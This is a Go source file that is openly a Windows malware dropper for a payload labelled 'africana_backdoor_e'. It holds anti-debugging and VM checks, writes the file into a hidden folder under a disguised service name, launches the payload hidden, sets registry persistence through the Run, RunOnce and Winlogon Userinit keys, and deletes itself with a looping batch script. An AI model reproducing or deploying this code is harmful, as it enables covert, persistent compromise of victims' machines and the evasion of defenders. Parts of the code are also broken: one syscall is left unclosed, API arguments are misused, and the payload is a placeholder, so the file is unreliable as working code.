package main

import (
    "crypto/rand"
    "encoding/base64"
    "fmt"
    "os"
    "path/filepath"
    "syscall"
    "time"
    "unsafe"
)

var (
    kernel32           = syscall.NewLazyDLL("kernel32.dll")
    advapi32           = syscall.NewLazyDLL("advapi32.dll")
    shell32            = syscall.NewLazyDLL("shell32.dll")
    ntdll              = syscall.NewLazyDLL("ntdll.dll")
    user32             = syscall.NewLazyDLL("user32.dll")
    procGetSystemTimes = kernel32.NewProc("GetSystemTimes")
)

const (
    KEY_SET_VALUE         = 0x0002
    KEY_QUERY_VALUE       = 0x0001
    KEY_ALL_ACCESS        = 0xF003F
    REG_SZ                = 1
    CREATE_NO_WINDOW      = 0x08000000
    FILE_ATTRIBUTE_HIDDEN = 0x02
    FILE_ATTRIBUTE_SYSTEM = 0x04
    MOVEFILE_DELAY_UNTIL_REBOOT = 0x4
)

var legitimateFolders = []string{
    "Windows\\System32\\Tasks",
    "ProgramData\\Microsoft\\Network\\Downloader",
    "ProgramData\\Microsoft\\Windows\\AppRepository",
    "ProgramData\\Package Cache",
    "Users\\Public\\Documents\\Adobe",
}

var legitimateExeNames = []string{
    "dllhost.exe", "svchost.exe", "runtimebroker.exe",
    "backgroundtaskhost.exe", "wmiprvse.exe", "msiexec.exe",
}

var encryptedStrings = map[string]string{
    "regKey":   "U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu",
    "userInit": "dXNlcmluaXQ=",
}

func decryptString(encrypted string) string {
    decoded, _ := base64.StdEncoding.DecodeString(encrypted)
    return string(decoded)
}

func generateLegitimateName() string {
    prefixes := []string{"Net", "Crypt", "Win", "Sec", "App", "Core", "Web", "Data"}
    suffixes := []string{"Service", "Host", "Runtime", "Manager", "Update", "Task", "Loader", "Broker"}
    
    now := time.Now().UnixNano()
    prefix := prefixes[int(now)%len(prefixes)]
    suffix := suffixes[int(now)%len(suffixes)]
    randomNum := int(now)%9000 + 1000

    return fmt.Sprintf("%s%s%d", prefix, suffix, randomNum)
}

func generateRandomAlphanumeric(length int) string {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    bytes := make([]byte, length)
    rand.Read(bytes)
    for i := range bytes {
        bytes[i] = chars[bytes[i]%byte(len(chars))]
    }
    return string(bytes)
}

func isDebuggerPresent() bool {
    isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
    ret, _, _ := isDebuggerPresent.Call()
    return ret != 0
}

func isVM() bool {
    model := make([]uint16, 256)
    kernel32.NewProc("GetComputerNameW").Call(
        uintptr(unsafe.Pointer(&model[0])),
        uintptr(unsafe.Pointer(&model[0])),
    )
    computerName := syscall.UTF16ToString(model)

    vmIndicators := []string{"VMWARE", "VIRTUAL", "QEMU", "XEN", "HYPER-V"}
    for _, indicator := range vmIndicators {
        for i := 0; i <= len(computerName)-len(indicator); i++ {
            if computerName[i:i+len(indicator)] == indicator {
                return true
            }
        }
    }
    return false
}

func sleepWithJitter() {
    jitter := time.Duration(time.Now().UnixNano()%1000) * time.Millisecond
    time.Sleep(2*time.Second + jitter)
}

func writeFileStealthy(path string, data []byte) error {
    for i := 0; i < len(data); i += 1024 {
        end := i + 1024
        if end > len(data) {
            end = len(data)
        }
        file, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0644)
        if err != nil {
            return err
        }
        file.Write(data[i:end])
        file.Close()
        time.Sleep(time.Duration(time.Now().UnixNano()%50) * time.Millisecond)
    }
    return nil
}

func setStealthAttributes(path string) {
    pathPtr, _ := syscall.UTF16PtrFromString(path)
    kernel32.NewProc("SetFileAttributesW").Call(
        uintptr(unsafe.Pointer(pathPtr)),
        FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,
    )
}

func executeViaCOM(targetPath string) bool {
    coInitialize := shell32.NewProc("CoInitialize")
    coCreateInstance := shell32.NewProc("CoCreateInstance")
    coUninitialize := shell32.NewProc("CoUninitialize")

    coInitialize.Call(0)

    var shellExecute uintptr
    ret, _, _ := coCreateInstance.Call(
        0x00021401,
        0,
        1,
        0x000216B4,
        uintptr(unsafe.Pointer(&shellExecute)),
    )
    
    if ret != 0 {
        return false
    }

    pathPtr, _ := syscall.UTF16PtrFromString(targetPath)
    shellExecuteProc := (*[0xffff]uintptr)(unsafe.Pointer(shellExecute))
    ret, _, _ = syscall.SyscallN(
        shellExecuteProc[7],
        shellExecute,
        uintptr(unsafe.Pointer(pathPtr)),
        0,
        0,
        0,
        0,

    coUninitialize.Call()
    return ret == 0
}

func addRegistryPersistenceStealthy(targetPath, valueName string) {
    persistenceLocations := []string{
        `Software\Microsoft\Windows\CurrentVersion\Run`,
        `Software\Microsoft\Windows\CurrentVersion\RunOnce`,
        `Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit`,
    }
    
    for _, location := range persistenceLocations {
        var hKey uintptr
        RegOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
        ret, _, _ := RegOpenKeyEx.Call(
            uintptr(0x80000001),
            uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(location))),
            0,
            KEY_SET_VALUE,
            uintptr(unsafe.Pointer(&hKey)),
        )

        if ret == 0 {
            RegSetValueEx := advapi32.NewProc("RegSetValueExW")
            if location == `Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit` {

                originalValue := make([]uint16, 260)
                var size uint32 = 260
                RegQueryValueEx := advapi32.NewProc("RegQueryValueExW")
                RegQueryValueEx.Call(
                    hKey,
                    uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(decryptString(encryptedStrings["userInit"])))),
                    0,
                    0,
                    uintptr(unsafe.Pointer(&originalValue[0])),
                    uintptr(unsafe.Pointer(&size)),
                )

                newValue := syscall.UTF16ToString(originalValue) + "," + targetPath
                newValuePtr, _ := syscall.UTF16PtrFromString(newValue)
                RegSetValueEx.Call(
                    hKey,
                    uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(decryptString(encryptedStrings["userInit"])))),
                    0,
                    REG_SZ,
                    uintptr(unsafe.Pointer(newValuePtr)),
                    uintptr((len(newValue)+1)*2),
                )
            } else {

                RegSetValueEx.Call(
                    hKey,
                    uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(valueName))),
                    0,
                    REG_SZ,
                    uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(targetPath))),
                    uintptr((len(targetPath)+1)*2),
                )
            }
            syscall.CloseHandle(syscall.Handle(hKey))
        }
    }
}

func scheduleSelfDestruction() {
    exePath, err := os.Executable()
    if err != nil {
        return
    }

    go func() {
        time.Sleep(3 * time.Second)
        os.Remove(exePath)
        pathPtr, _ := syscall.UTF16PtrFromString(exePath)
        kernel32.NewProc("MoveFileExW").Call(
            uintptr(unsafe.Pointer(pathPtr)),
            0,
            MOVEFILE_DELAY_UNTIL_REBOOT,
        )

        batContent := fmt.Sprintf("@echo off\n:loop\ndel \"%s\" >nul 2>&1\nif exist \"%s\" goto loop\ndel \"%%~f0\"", exePath, exePath)
        batPath := filepath.Join(os.TempDir(), generateRandomAlphanumeric(8)+".bat")
        
        os.WriteFile(batPath, []byte(batContent), 0644)

        var si syscall.StartupInfo
        var pi syscall.ProcessInformation
        si.Cb = uint32(unsafe.Sizeof(si))
        si.Flags = syscall.STARTF_USESHOWWINDOW
        si.ShowWindow = syscall.SW_HIDE
        
        batPathPtr, _ := syscall.UTF16PtrFromString(batPath)
        kernel32.NewProc("CreateProcessW").Call(
            0,
            uintptr(unsafe.Pointer(batPathPtr)),
            0,
            0,
            0,
            CREATE_NO_WINDOW,
            0,
            0,
            uintptr(unsafe.Pointer(&si)),
            uintptr(unsafe.Pointer(&pi)),
        )
    }()
}

func cleanArtifacts(targetPath string) {
    go func() {
        time.Sleep(5 * time.Second)
        os.Remove(targetPath)
        targetFolder := filepath.Dir(targetPath)
        os.Remove(targetFolder)

        pathPtr, _ := syscall.UTF16PtrFromString(targetPath)
        kernel32.NewProc("SetFileAttributesW").Call(
            uintptr(unsafe.Pointer(pathPtr)),
            0,
        )
        
        folderPtr, _ := syscall.UTF16PtrFromString(targetFolder)
        kernel32.NewProc("SetFileAttributesW").Call(
            uintptr(unsafe.Pointer(folderPtr)),
            0,
        )
    }()
}

func main() {
    if isDebuggerPresent() || isVM() {
        os.Exit(0)
    }

    payload, _ := base64.StdEncoding.DecodeString("africana_backdoor_e")

    folderName := generateLegitimateName()
    exeName := generateRandomAlphanumeric(8) + ".exe"
    valueName := generateLegitimateName()

    basePaths := []string{
        os.Getenv("ProgramData"),
        os.Getenv("APPDATA"),
        os.Getenv("LOCALAPPDATA"),
        filepath.Join(os.Getenv("SystemRoot"), "System32"),
    }

    basePath := basePaths[int(time.Now().UnixNano())%len(basePaths)]
    targetFolder := filepath.Join(basePath, folderName)
    targetPath := filepath.Join(targetFolder, exeName)

    os.MkdirAll(targetFolder, 0755)
    setStealthAttributes(targetFolder)

    writeFileStealthy(targetPath, payload)
    setStealthAttributes(targetPath)

    success := executeViaCOM(targetPath)
    if !success {
        var si syscall.StartupInfo
        var pi syscall.ProcessInformation
        si.Cb = uint32(unsafe.Sizeof(si))
        si.Flags = syscall.STARTF_USESHOWWINDOW
        si.ShowWindow = syscall.SW_HIDE

        pathPtr, _ := syscall.UTF16PtrFromString(targetPath)
        kernel32.NewProc("CreateProcessW").Call(
            0,
            uintptr(unsafe.Pointer(pathPtr)),
            0,
            0,
            0,
            CREATE_NO_WINDOW,
            0,
            0,
            uintptr(unsafe.Pointer(&si)),
            uintptr(unsafe.Pointer(&pi)),
        )
    }

    addRegistryPersistenceStealthy(targetPath, valueName)
    sleepWithJitter()
    cleanArtifacts(targetPath)
    scheduleSelfDestruction()
    os.Exit(0)
}
